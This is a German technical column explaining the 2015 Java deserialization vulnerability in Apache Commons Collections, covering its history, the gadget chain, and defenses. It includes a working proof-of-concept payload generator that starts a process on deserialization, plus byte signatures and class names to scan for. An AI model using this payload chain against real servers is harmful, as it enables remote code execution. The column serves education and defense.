<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>JEXP | Operation Sorglos: Deserialisierung in Java</title>
    <meta http-equiv='Content-Style-Type' content='text/css' />
  <link rel='stylesheet' href='/css/jexp.css' type='text/css' />
  <link rel="openid.server" href="http://jexp.de/id" />
<!--HeaderText--><style type='text/css'><!--
  div.wikibody { line-height: 1.6em; font-size:1.4em; }
  ul, ol, pre, dl, p { margin-top:0px; margin-bottom:0px; }
  code.escaped { white-space: nowrap; }
  .vspace { margin-top:1.33em; }
  .indent { margin-left:40px; }
  .outdent { margin-left:40px; text-indent:-40px; }
  a.createlinktext { text-decoration:none; border-bottom:1px dotted gray; }
  a.createlink { text-decoration:none; position:relative; top:-0.5em;
    font-weight:bold; font-size:smaller; border-bottom:none; }
  img { border:0px; }
   
  table.tabtable { border-collapse: collapse; }
  table.tabtable td { border:1px solid #cccccc; }

div.sourceblock {
	padding: 0.5em;
	border: 1px solid #808080;
	background-color: #F1F0ED; }
div.sourceblock div {
	font-family: monospace;
	font-size: small;
	line-height: 1; }
div.sourceblock div.head, div.sourceblock div.foot {
	font: italic medium serif;
	padding: 0.5em;
}
div.codeblock {
	padding: 0.5em;
	border: 1px solid #808080;
	background-color: #F1F0ED; }
div.codeblock pre {
	font-family: monospace;
	font-size: small;
	line-height: 1; }.editconflict { color:green; 
  font-style:italic; margin-top:1.33em; margin-bottom:1.33em; }

  table.markup { border:2px dotted #ccf; width:90%; }
  td.markup1, td.markup2 { padding-left:10px; padding-right:10px; }
  table.vert td.markup1 { border-bottom:1px solid #ccf; }
  table.horiz td.markup1 { width:23em; border-right:1px solid #ccf; }
  table.markup caption { text-align:left; }
  div.faq p, div.faq pre { margin-left:2em; }
  div.faq p.question { margin:1em 0 0.75em 0; font-weight:bold; }
   
    .frame 
      { border:1px solid #cccccc; padding:4px; background-color:#f9f9f9; }
    .lfloat { float:left; margin-right:0.5em; }
    .rfloat { float:right; margin-left:0.5em; }
a.varlink { text-decoration:none; }

--></style>
    <meta name='robots' content='index,follow' />


</head>
<body>
<!--PageHeaderFmt-->
  <div id='wikihead'><a href='/'><img src='/img/jexp.gif'
    alt='JEXP' border='0' align="center" /></a>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    JEXP</div>
<!--/PageHeaderFmt-->

<div id="wikileft">
   <ul>
	<li><a class='urllink' href='http://www.jexp.de/blog'>BLOG</a></li>
	<li><a class='urllink' href='http://github.com/jexp'>GitHub</a></li>
	<li><a class='urllink' href='/conferences.html'>Conferences</a></li>
	<li><a class='urllink' href='/articles.html'>Articles</a></li>
	<li><a class='urllink' href='/books.html'>Books</a></li>
	<li><a class='urllink' href='/projects.html'>Projects</a></li>
	<li><a class='urllink' href='/bio.html'>Bio</a></li>
<!--
<li><a class='wikilink' href='/Main.Projects'>Projects</a>
<p class='vspace'></p></li><li><a class='wikilink' href='/Info.Biografie'>Bio</a>
<p class='vspace'></p></li><li><a class='wikilink' href='/Business.Referenzen'>References</a>
<p class='vspace'></p></li><li><a class='wikilink' href='/Info.Links'>Links</a>
</li><li><a class='urllink' href='http://www.librarything.com/catalog/mesirii' rel='nofollow'>Books</a>
<p class='vspace'></p></li><li><a class='wikilink' href='/Info.BetterDevelopment'>BetterDevelopment</a>
</li><li><a class='wikilink' href='/Info.Konferenzen'>Conferences</a>
</li><li><a class='wikilink' href='/Info.Demotivators'>Demotivators</a>
</li><li><a class='wikilink' href='/Info.Quotes'>Quotes</a>
</li><li><a class='wikilink' href='/Main.Reviews'>Reviews</a>
<ul><li><a class='wikilink' href='/DslBook.DslBook'>DslBook</a>
</li></ul></li><li><a class='wikilink' href='/Main.Java'>Java</a>
<ul><li><a class='urllink' href='http://jequel.de' rel='nofollow'>Jequel</a>
</li><li><a class='wikilink' href='/BricksAndMortar.BricksAndMortar'>BricksAndMortar</a>
</li><li><a class='wikilink' href='/Java.Projects'>Look@Projects</a>
</li><li><a class='wikilink' href='/Java.Spring'>Spring</a>
</li><li><a class='wikilink' href='/Java.Code'>Code</a>
</li></ul><p class='vspace'></p></li><li><a class='wikilink' href='/Site.Impressum'>Impressum</a>
<p class='vspace'></p></li><li><a class='wikilink' href='/Site.Internal'>Internal</a>
</li>
-->

</ul>

</div>

<div id="wikibody">

<div class="sect1">
<h2 id="_einem_geschenkten_trojanischen_gaul_schaut_man_besser_ins_maul">Einem geschenkten (Trojanischen) Gaul schaut man besser ins Maul</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Im November 2015 hat eine kritische Sicherheitslücke die Java- und IT-Welt aufgewühlt.
Zum Teil wurde sie "so bedeutsam wie Heartbleed" eingeschätzt.
In der heutigen Kolumne will ich sie etwas näher beleuchten und die Hintergründe darstellen.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_eine_geschichte_in_3_akten">Eine Geschichte in 3 Akten</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Interessanterweise wurde dieser Angriffsvektor schom Ende Januar auf der AppSecCali2015 Konferenz von Gabriel Lawrence und Chris Frohoff von Qualcom im Rahmen einer umfangreicheren Präsentation zum Thema "Angriffe durch ungesicherte Deserialisierung von Nutzerdaten" ("Marshalling Pickles – how deserializing objects will ruin your day") präsentiert.</p>
</div>
<div class="exampleblock">
<div class="content">
<div class="paragraph">
<p>Der Angriff nutzt den ungesicherten Aufruf von Methoden auf deserialisierten Daten während oder nach der Deserialisierung aus.
Wenn die transitiv aufgerufenen Zielmethoden potentiell Schadcode ausführen können, ist das Ziel der Angreifer erreicht.</p>
</div>
<div class="paragraph">
<p>Die serialisierten Daten wurden <strong>in diesem Beispiel</strong> mittels Hilfsklassen der Apache Commons Collections Bibliothek präpariert,
welche die transparente Transformation von Werten in Containerobjekten, hier sogar dynamisch durch Nutzung von Reflection erlauben.
Ähnliches wurde damals auch für Groovy&#8217;s dynamische Maps demonstriert.</p>
</div>
</div>
</div>
<div class="paragraph">
<p>Dabei wurde neben dem Angriff auch ein Tool gezeigt, das entsprechende Schad-"Nutz"-daten erzeugen kann.
Da diese Angriffsmöglichekeit aber eher unspektakulär neben anderen Programmiersprachen und Ansätzen dargestellt wurde,
scheint er der Aufmerksamkeit der Öffentlichkeit und auch anderer Sicherheitsexperten entgangen zu sein.</p>
</div>
<div class="paragraph">
<p>Erst ein sehr interessanter Vortrag von Matthias Kaiser (Code White, Ulm) Ende Oktober im HackerPraktikum an der Ruhr Uni Bochum ging detaillierter auf die Sicherheitslücke ein
und demonstrierte die Ausnutzbarkeit live am Beispiel einer (seither gefixten) Version von Atlassian Bamboo.</p>
</div>
<div class="paragraph">
<p>Matthias hat darauf hingewiesen dass diese Schwachstelle schon weit vorher thematisiert wurde, z.B. von Pierre Ernst in einem developerWorks Artikel in 2013.</p>
</div>
<div class="paragraph">
<p>Das spornte Steve Breen (Foxglove Security) an, diese Sicherheitslücke genauer unter die Lupe zu nehmen und zu zeigen, dass häufig genutzte Java Web- und Applicationserver (u.a. WebLogic, IBM WebSphere, JBoss, Jenkins, OpenNMS) anfällig für diesen Angriff waren.
Dieser auch etwas theatralische Artikel hat dann die weltweite "Welle des Entsetzens" ausgelöst, die wir im November erlebt haben.</p>
</div>
<div class="paragraph">
<p>Wie zu erwarten war, haben sich viele der nachfolgenden Berichterstatter nicht die Mühe gemacht, die Hintergründer zu verstehen und akkurat zu berichten.
Leider hat Steve Breen es nicht für nötig gehalten, die betroffenen Produkte vor der Veröffentlichung seines Artikels zu benachrichtigen, was normalerweise bei solchen erstmalig nachgewiesenen, kritischen Sicherheitslücken (Zero-Day-Exploit) Usus ist.</p>
</div>
<div class="paragraph">
<p>Zum einen nehmen sie auf verschiedene Weise serialisierte Java-Objekte über das Netzwerk entgegen und deserialisieren sie ungesichert.
Desweiteren sind Bibliotheken im Klassenpfad enthalten, die zur Ausnutzung dieses Verhaltens genutzt werden können.</p>
</div>
<div class="paragraph">
<p>Dieser Angriff konnte nur verhindert werden, indem man die entsprechenden Klassen (z.B. <code>InvokerTransformer</code>) aus der Jar-Dateien der Bibliotheken entfernte.</p>
</div>
<div class="paragraph">
<p>Mittlerweile wurden aktualisierte Versionen (3.2.2, 4.1) von Apache Commons Collections veröffentlicht, die die Serialisierbarkeit dieser Klassen standardmässig abschalten, aber sie in vertrauenswürdigen Umgebungen durch eine System-Property wieder aktivieren lässt.
Auch für andere Bibliotheken wie Groovy (2.4.4) und Spring (4.1.9, 4.2.3) sind Versionen verfügbar, die nicht mehr für diesen Angriff genutzt werden können.</p>
</div>
<div class="paragraph">
<p>Da Java-Deserialisierung, besonders auch von Daten die über das Netzwerk empfangen werden, in der Java Welt gang und gäbe ist (dazu später mehr),
ist es sehr augenscheinlich, dass dies nicht die einzige schadhafte Kombination darstellt.</p>
</div>
<div class="paragraph">
<p>Leider wurde bisher noch nicht genügend Augenmerk auf die Absicherung des Deserialisierungs-Mechanismus gelegt.
Es bleibt zu hoffen, dass Oracle selbst dafür sorgt, dass während der Deserialisierung selbst, der transitive Aufruf bestimmter, potentiell gefährliche Methoden abgeblockt wird.
Aber selbst nach einer erfolgreichen Deserialisierung sollte man Daten, die aus nicht vertrauenswürdigen Quellen stammen, und plötzlich als aktives Objekt in der eigenen JVM leben, mit entsprechender Vorsicht begegnen.</p>
</div>
<div class="paragraph">
<p>Zum Glück muss man nicht nur auf Sicherheitsexperten vertrauen, sondern kann sich mit einigen quelloffenen Tools selbst ein Bild davon verschaffen,
ob die eigene Infrastruktur potentiell gefährliche Kombinationen enthält.</p>
</div>
<div class="paragraph">
<p>Die Stimmen, die der Apache Bibliothek die Schuld an allem gaben haben nur teilweise recht.
Zwar machen die dort vorhandenen, serialisierbaren Klassen es deutlich leichter die Sicherheitslücke auszunutzen,
aber das Grundproblem liegt am sorglosen Umgang mit Daten aus nicht vertrauenswürdigen Quellen.</p>
</div>
<div class="paragraph">
<p>Im Statement der Apache Foundation ist auch genau das nachzulesen:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>It is not Apache Commons Collections that is unsafe, it is applications which use Java Serialization in an unsafe way.</p>
</div>
<div class="paragraph">
<p>If anybody asks you whether an application is unsafe because of Apache Commons Collections,
explain to them that deserializing untrusted data is unsafe, not the presence of generally useful libraries.</p>
</div>
</blockquote>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_art_des_angriffs">Art des Angriffs</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Der Angriff gehört zu einer noch relativ unerforschten, neuen Klasse von Ansätzen, die davon ausgehen, dass ungesicherte Deserialisierung von Objekten, die von ausserhalb kommen, eine weitverbreitete Sicherheitslücke darstellt.
Dabei ist nicht die Deserialisierung ein Problem, sondern dass sie nicht genügend gegen böswillige Nutzlast abgesichert ist.
Wie bei vielen Angriffen werden auch hier mehrere Konstrukte kombiniert, die nur gemeinsam dazu führen, dass man durch die Deserialisierung eines Objektes freien Zugriff auf Reflection-Aufrufe bekommt.
Mit denen hat man man natürlich vollen Zugriff auf beliebige Klassen und Methoden innerhalb der JVM, besonders aber durch Aufrufe von <code>Runtime.getRuntime().exec()</code> auch mit den Rechten des Benutzers auf dem Recher auf dem die Java Anwendung läuft.</p>
</div>
<div class="paragraph">
<p>Eigentlich ist die JVM ja für ihre Sandbox bekannt, leider ist diese aber nur zwangsweise bei Applets und Webstart-Anwendungen aktiv.
Die meisten Java-Server und Desktopanwendungen laufen ohne <code>SecurityManager</code> und können somit beliebige Operationen auf der Maschine ausführen.
Meist wird das mit Leistungseinbussen und der Komplexität der Konfiguration von <code>Permissions</code> für den Security-Manager begründet.
Abgesicherter Bytecode muss auch in signierten Jars vorliegen, so dass sichergestellt werden kann, dass niemand zwischenzeitlich Veränderungen am Bytecode vorgenommen hat.</p>
</div>
<div class="paragraph">
<p>Das etwas skurrile Konstrukt das für das Ausnutzen dieser Sicherheitslücke notwendig ist, beleuchten wir gleich etwas im Detail.</p>
</div>
<div class="paragraph">
<p>Zuerst aber noch etwas zu den Grundlagen der (De-)Serialisierung in Java.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_serialisierung_in_java">Serialisierung in Java</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Seit den ersten Versionen von Java war es bequemlicherweise leicht möglich, Java Objekte zu serialisieren, indem man es in einen ObjectOutputStream schreibt, dessen Ausgabe dann entweder als Datei auf der Festplatte, Datenstrom im Netz oder in einem Byte-Array landet.</p>
</div>
<div class="paragraph">
<p>Serialisierbar ist ein Objekt, wenn es direkt oder indirekt <code>java.io.Serializable</code> implementiert und all seine nicht-transistenten Felder entweder primitiv oder auch serialisierbar sind.
Es ist anzuraten für die Handhabung der Kompatibilität zwischen Versionen von Klassen ein Long-Feld namens <code>serialVersionUID</code> anzulegen, dessen Inhalt geändert werden muss, wenn sich die Klasse inkompatibel zu Vorgängerversionen geändert hat.</p>
</div>
<div class="paragraph">
<p>Die zweite Anforderung kann mittels spezieller Methoden, <code>writeReplace</code> und <code>writeObject</code> umgangen werden.
Dabei kann man in der <code>writeObject</code>-Methode die Serialisierung selbst im Einzelnen kontrollieren, z.B. um eine effizientere Speicherung von aufwendigen Datenstrukturen vorzunehmen. Bei <code>writeReplace</code> kann man statt des aktuellen Objektes, eine andere Instanz zur Serialisierung nominieren.</p>
</div>
<div class="paragraph">
<p>Bei der Serialisierung wird der Objektbaum rekursiv durchgegangen und beginnend beim Wurzelobjekt bis zu allen primitiven Feldern Repräsentationen als Bytes in den Datenstrom geschrieben. Falls es sich um einen Objektgraphen mit Zyklen handelt werden für schon gesehene Objekte nur noch Marker geschrieben.</p>
</div>
<div class="paragraph">
<p>Hier sehen wir die Serialisierung eines einfachen Objektes und die Binärdarstellung des Ergebnisses, in dem man Klassennamen der Instanzen und ihre Inhalte sehr schön erkennen kann.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="java language-java">static class Magazine implements Serializable {
    String title;
    LocalDate date;
    int pages;
}

public static void main(String[] args) throws Exception {
    Magazine javaSpektrum = new Magazine("JavaSpektrum 6/2015",
                                 LocalDate.of(2015,11,20), 66);
    ObjectOutputStream oos = new ObjectOutputStream(
                          new FileOutputStream("magazin.ser"));
    oos.writeObject(javaSpektrum);
    oos.close();

    Magazine gelesen = (Magazine)new ObjectInputStream(
	                   new FileInputStream("magazin.ser"))
	                   .readObject();

    assert gelesen.title.equals(javaSpektrum.title) &amp;&amp;
           gelesen.date.equals(javaSpektrum.date) &amp;&amp;
           gelesen.pages == javaSpektrum.pages;
}</code></pre>
</div>
</div>
<div class="listingblock">
<div class="title">hexdump -C magazin.ser</div>
<div class="content">
<pre>00000000  ac ed 00 05 73 72 00 22  65 78 61 6d 70 6c 65 2e  |....sr."example.|
00000010  53 65 72 69 61 6c 69 7a  61 74 69 6f 6e 54 65 73  |SerializationTes|
00000020  74 24 4d 61 67 61 7a 69  6e 65 44 5d 53 78 5d 43  |t$MagazineD]Sx]C|
00000030  95 e8 02 00 03 49 00 05  70 61 67 65 73 4c 00 04  |.....I..pagesL..|
00000040  64 61 74 65 74 00 15 4c  6a 61 76 61 2f 74 69 6d  |datet..Ljava/tim|
00000050  65 2f 4c 6f 63 61 6c 44  61 74 65 3b 4c 00 05 74  |e/LocalDate;L..t|
00000060  69 74 6c 65 74 00 12 4c  6a 61 76 61 2f 6c 61 6e  |itlet..Ljava/lan|
00000070  67 2f 53 74 72 69 6e 67  3b 78 70 00 00 00 42 73  |g/String;xp...Bs|
00000080  72 00 0d 6a 61 76 61 2e  74 69 6d 65 2e 53 65 72  |r..java.time.Ser|
00000090  95 5d 84 ba 1b 22 48 b2  0c 00 00 78 70 77 07 03  |.]..."H....xpw..|
000000a0  00 00 07 df 0b 14 78 74  00 13 4a 61 76 61 53 70  |......xt..JavaSp|
000000b0  65 6b 74 72 75 6d 20 36  2f 32 30 31 35           |ektrum 6/2015|
000000bd</pre>
</div>
</div>
<div class="paragraph">
<p>Wie man sehen kann, beginnt der Binärcode immer mit dem Marker <code>ac ed 00 05</code>, die man auch nutzen kann, um ggf. im Datenstrom der eigenen Java-Server nach potentiell serialisierten Java-Objekten zu suchen.
Falls diese als base-64 formatierte Daten gesendet werden, beginnt der Datenblock dann mit <code>rO0</code>.</p>
</div>
<div class="paragraph">
<p>Soweit keine Überraschungen. Jetzt zur Deserialisierung, die eigentlich ähnlich einfach abläuft.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Aus einem <code>ObjectInputStream</code> liest man die geschriebenen Objekte.</p>
</li>
<li>
<p>Von diesen werden Instanzen erzeugt, ohne den Konstruktor aufzurufen!</p>
</li>
<li>
<p>Dann werden rekursiv wieder die Felder gelesen, ggf. weiter Objekte instanziiert.</p>
</li>
<li>
<p>Falls irgendwo durch den Wechsel der Klassensignatur oder der <code>serialVersionUID</code> eine Inkompatibilität ergibt, bricht das Laden mit einem <code>InvalidClassException</code> (oder einer anderen Exception) ab.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Wie beim Schreiben der Objekte, kann die Deserialisierung mittels eigener Methoden gesteuert werden.
Mit <code>readResolve</code> kann man statt des gelesenen Objektes ein anderes zurückgeben, was z.b. bei Singletons wie Enums genutzt wird.
Die Implementierung von <code>readObject</code> kann das Lesen des Objektes wieder voll kontrollieren, so z.B. auch nachgelagerte Initialisierungen vornehmen.</p>
</div>
<div class="paragraph">
<p>Und dort fängt der Spass an&#8230;&#8203;</p>
</div>
<div class="paragraph">
<p>Wenn während der Deserialisierung, noch bevor man die Objektinstanz zurückbekommt, aktiv Methoden auf Feldern der Klasse aufgerufen werden, deren Inhalt gerade erst aus einer nicht-vertrauenswürdigen Quelle wiederhergestellt wurde, kann man sich vorstellen, dass Dinge passieren, die man vermeiden möchte.</p>
</div>
<div class="paragraph">
<p>Im einfachsten Fall gibt es einen Fehler während dieses Zugriffs und die Methode die die Deserialisierung veranlasst hat (und ggf der Thread) werden abgebrochen. Das kann schon für eine kleine Denial-of-Service Attacke ausgenutzt werden.
Desweiteren können grosse Datenmengen oder Endlosschleifen verursacht werden (z.B. durch Selbstreferenzen die zu rekursiven Aufrufen führen).
Aber auch das ist noch nicht schlimm.</p>
</div>
<div class="paragraph">
<p>Freien Zugriff auf die JVM gibt es, wenn Inhalte der Felder genutzt werden können, um frei Operationen innerhalb der JVM auszuführen, z.B. mittels Reflection, Proxies oder `javax.ScriptEngine`s.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_anwendungsbereiche_für_serialisierung">Anwendungsbereiche für Serialisierung</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Ganz am Anfang, wurde Serialisierung in Java dafür genutzt, den Zustand einer Anwendung zu persistieren, daher sind kurioserweise viele AWT- und Swing-Klassen serialisierbar und mit diversen Details darüber versehen.
Bald lag der Fokus aber auf dem Serialisieren von komplexen Daten z.B. um sie auf Festplatte oder in Datenbanken als Blob zu speichern oder über das Netzwerk zu transportieren oder als Methodenparameter und Rückgabewerte für RPC via RMI zu nutzen.
Bei all diesen Ansätzen kann man der Anwendung präparierte Daten unterschieben, über das (offene) Netzwerk geht es aber am einfachsten.
Und Objekt-Serialisierung wird bei diversen Netzwerkprotokollen im Java-Umfeld eingesetzt: RMI, RMI-über-HTTP, JMX, JMS, Spring-Invoker, teilweise für Http-Cookies usw.
Daher gibt es in den meisten Server-Anwendungen genügend Einfallstore, um gemeingefährliche Daten einzuschleusen.</p>
</div>
<div class="paragraph">
<p>Um eine solche Attacke erfolgreich auszuführen, benötigt man also die folgenden Zutaten.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_erfolgsrezept">Erfolgsrezept</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Wie in der Einleitung schon erläutert, benötigt man für diese Art von Angriff eine Kombination von drei Verhaltensweisen, die gemeinsam zum Erfolg führen.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Muss es die Anwendung serialisierte Objekte entgegenzunehmen und diese ohne weitere Prüfung zu deserialisieren.</p>
</li>
<li>
<p>Zum zweiten muss eine zu deserialisierende Klasse vorliegen, die <code>readObject</code> implementiert und darin auf den soeben deserialisierten eigenen Feldern Methoden aufruft.</p>
</li>
<li>
<p>Diese Methoden rufen wiederhin transitiv über mehrere Ecken potentielle gefährliche Methoden auf, wenn möglich mit den präparierten Nutzdaten.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Im von Matthias Kaiser gezeigten Beispiel wurde ein Servlet von Atlassian Bamboo genutzt, das Nutzdaten deserialisiert.
Die serialisierbare <code>TransformedMap</code>, konfiguriert einem <code>InvokerTransformer</code> aus Apache Commons Collections liefert uns die Schadmethode - den dynamischen Aufruf von <code>Method.invoke()</code>, die sogar mit ihren Parametern serialisierbar sind.
Damit benötigt man nur noch ein deserialisierbares Objekt, dass in seinem <code>readObject</code> auf einem eigenen <code>Map</code>-Feld die Methode <code>Map.Entry.setValue()</code> aufruft, um den genannten Transformer zu triggern.
Das stellt uns Sun, mit dem <code>AnnotationInvocationHandler</code> zur Verfügung, der im <code>readObject</code> prüft, ob die de-serialisierte Ziel-Annotationsklasse immer noch denselben Elementtyp für ihre Attribute hat, die in einer ebenfalls de-serialisierten <code>Map</code>!! gespeichert sind.
Falls nicht, wird mittels <code>Map.Entry.setValue()</code> ein ExceptionProxy statt des Originaltyps gesetzt, was dann unseren gemein vorkonfigurierten <code>InvokerTransformer</code> triggert.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="jqassistant_deserialize_vulnerability_chain.jpg" alt="jqassistant deserialize vulnerability chain">
</div>
<div class="title">Figure 1. Visuelle Darstellung der Aufrufkette</div>
</div>
<div class="paragraph">
<p>Um den möglichen Schaden zu maximieren, wird als dynamisch aufzurufende Methode die Ausführung eines Prozesses auf der Maschine gewählt:</p>
</div>
<div class="paragraph">
<p>Das Listing zum Generieren der Schaddaten ist online in meinem JavaSpektrum Repository verfügbar.</p>
</div>
<div class="listingblock">
<div class="title">Demo zum Starten eines OSX-Calculators mittels ProcessBuilder beim Deserialisieren</div>
<div class="content">
<pre class="highlight"><code class="java language-java">public class PayloadGenerator {
    public static void main(String[] args) throws Exception {
        final String[] execArgs = new String[] {
                "/Applications/Calculator.app/Contents/MacOS/Calculator" };

        // invoking new ProcessBuilder(execArgs).start()
        final Transformer transformers = new ChainedTransformer(
            new ConstantTransformer(ProcessBuilder.class),
            new InstantiateTransformer(new Class[]{String[].class},new Object[]{ execArgs }),
            new InvokerTransformer("start", null,null));

        // preparing fieldMap for @Target.value == "value"
        String annotationFieldName = Target.class.getDeclaredMethod("value").getName();
        final Map annotationFields = singletonMap(annotationFieldName,"foo");

        // decorating map with process starting transformers
        TransformedMap transformedMap =
                TransformedMap.transformingMap(annotationFields, null, transformers);

        // setting up AnnotationInvocationHandler with prepared instance data to be serialized
        Class&lt;?&gt; type = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor&lt;?&gt; constructor = type.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object handler = constructor.newInstance(Target.class, transformedMap);

        // serializing handler
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("transformer.ser"));
        oos.writeObject(handler);
        oos.close();

        // demonstrating deserialization starts calculator
        new ObjectInputStream(new FileInputStream("transformer.ser")).readObject();
    }</code></pre>
</div>
</div>
<div class="paragraph">
<p>Ich habe, um das ganze etwas zu vereinfachen, stattdessen <code>new ProcessBuilder(args).start()</code> aufgerufen, und den Code etwas vereinfacht.
Um zu zeigen, dass es vollkommen egal ist, ob die Deserialisierung erfolgreich ist, habe ich als Map-Instanz <code>Collections.singletonMap</code> benutzt, die unveränderlich ist,
also gar kein <code>Map.Entry.setValue()</code> zulässt.
D.h. obwohl der eigentliche <code>setValue</code> Aufruf fehlschlägt, wird der Transformer vorher noch ausgeführt und started den Calculator, wie man anhand des Stacktraces im Screenshot auch sehr schön sehen kann.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="deserialize_vulnerability_demo.jpg" alt="deserialize vulnerability demo">
</div>
<div class="title">Figure 2. Screenshot Auslösung der Sicherheitslücke</div>
</div>
<div class="paragraph">
<p>Die originalen Autoren stellten ein Tool (ysoserial) bereit, dem man nur noch den Unix-Shell-Befehl mitgeben musste, den man auf dem Server ausgeführt haben möchte, und welches dann den korrekten serialisierten Binärdump erzeugt.</p>
</div>
<table class="tableblock frame-all grid-all" style="width: 100%;">
<caption class="title">Table 1. Beteiligte Klassen</caption>
<colgroup>
<col style="width: 20%;">
<col style="width: 20%;">
<col style="width: 20%;">
<col style="width: 20%;">
<col style="width: 20%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Klasse</th>
<th class="tableblock halign-left valign-top">Zeile</th>
<th class="tableblock halign-left valign-top">Aufruf</th>
<th class="tableblock halign-left valign-top">in Methode</th>
<th class="tableblock halign-left valign-top">Link</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">AnnotationInvocationHandler</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">355</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Map.Entry.setValue</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">readObject</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7u40-b43/sun/reflect/annotation/AnnotationInvocationHandler.java#356" class="bare">http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7u40-b43/sun/reflect/annotation/AnnotationInvocationHandler.java#356</a></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">TransformedMap</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">218</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">transformer.transform</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">checkSetValue</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="https://github.com/apache/commons-collections/blob/trunk/src/main/java/org/apache/commons/collections4/map/TransformedMap.java#L218" class="bare">https://github.com/apache/commons-collections/blob/trunk/src/main/java/org/apache/commons/collections4/map/TransformedMap.java#L218</a></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">AbstractInputCheckedMapDecorator.MapEntry</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">201</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">parent.checkSetValue</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">setValue</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="https://github.com/apache/commons-collections/blob/trunk/src/main/java/org/apache/commons/collections4/map/AbstractInputCheckedMapDecorator.java#L201" class="bare">https://github.com/apache/commons-collections/blob/trunk/src/main/java/org/apache/commons/collections4/map/AbstractInputCheckedMapDecorator.java#L201</a></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">InvokerTransformer</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">134</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">method.invoke</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">transform</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="https://github.com/apache/commons-collections/blob/trunk/src/main/java/org/apache/commons/collections4/functors/InvokerTransformer.java#L134" class="bare">https://github.com/apache/commons-collections/blob/trunk/src/main/java/org/apache/commons/collections4/functors/InvokerTransformer.java#L134</a></p></td>
</tr>
</tbody>
</table>
</div>
</div>
<div class="sect1">
<h2 id="_schutzkreis">Schutzkreis</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Wie kann man sich gegen solche Sicherheitslücken schützen?
Es ist ziemlich schwierig, weil die Verantwortung, sowohl bei Oracle als auch den Application-Server Herstellern liegt, die Deserialisierung von vertrauensunwürdigen Quellen besser abzusichern.
Wenn die eigene Anwendung so etwas macht, sollte man tunlichst darauf achten, an diesen Stellen keinen aktiven Code auf deserialisierten Werten aufzurufen, und diese auch noch einmal zur Sicherheit in bekannte Datenstrukturen zu kopieren.</p>
</div>
<div class="paragraph">
<p>Für die bisher gefundene Lücke, wird empfohlen, die Apache Commons Collection Bibliothek aktualisieren auf 3.2.2 oder 4.1.
Falls das nicht möglich ist, kann man die Jar-Datei der Bibliothek modifizieren, und die Transformer Implementierungsklassen entfernen.</p>
</div>
<div class="paragraph">
<p>Man kann den Datenstrom eigener Java-Server überwachen und Pakete mit den Signaturen von Java-Serialisierung abblocken oder zumindest loggen.
Desweiteren kann nach den, im Angriff genutzten Klassennamen gescannt werden.</p>
</div>
<div class="ulist">
<ul>
<li>
<p>org.apache.commons.collections4?.map.TransformedMap</p>
</li>
<li>
<p>org.apache.commons.collections4?.Transformer</p>
</li>
<li>
<p>org.apache.commons.collections.functors.InvokerTransformer</p>
</li>
<li>
<p>org.apache.commons.collections.functors.InstantiateTransformer</p>
</li>
<li>
<p>org.codehaus.groovy.runtime.ConvertedClosure</p>
</li>
<li>
<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p>
</li>
<li>
<p>sun.reflect.annotation.AnnotationInvocationHandler</p>
</li>
</ul>
</div>
<div class="paragraph">
